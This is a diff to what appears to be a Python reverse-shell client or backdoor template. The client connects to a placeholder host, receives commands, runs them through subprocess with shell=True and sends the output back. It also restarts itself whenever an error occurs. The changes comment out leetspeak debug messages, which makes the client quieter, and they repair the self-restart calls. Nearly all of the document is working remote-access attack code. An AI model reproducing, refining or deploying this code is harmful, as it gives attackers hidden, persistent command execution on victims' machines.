@@ -12,12 +12,10 @@ def program_restart():
         os.execl(python, python, * sys.argv)
         curdir = os.getcwd()
 
-pf = program_restart()
-
 def try_connect():
     while True:
         try:
-            print("[i] T6Y1NG 70 C0NN3C7...") # Debug only
+            #print("[i] T6Y1NG 70 C0NN3C7...") # Debug only
             s.connect(('{}', {}))
             break
 
@@ -30,7 +28,7 @@ def try_connect():
 try_connect()
 while True:
     try:
-        print("[i] W3 463 N0W C0NN3C73D 70 7H3 S36V36!") # Debug only
+        #print("[i] W3 463 N0W C0NN3C73D 70 7H3 S36V36!") # Debug only
         cmd = s.recv(1024)
         if cmd[:2] == 'cd':
             os.chdir(cmd[3:])
@@ -44,7 +42,7 @@ while True:
                 s.sendall(results)
 
             except:
-                pf.program_restart()
+                program_restart()
     
         else:
             results = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
@@ -53,10 +51,10 @@ while True:
                 s.sendall(n+results)
 
             except:
-                pf.program_restart()
+                program_restart()
 
     except(BrokenPipeError, OSError):
-        pf.program_restart()
+        program_restart()
 
     except:
-        pf.program_restart()
+        program_restart()
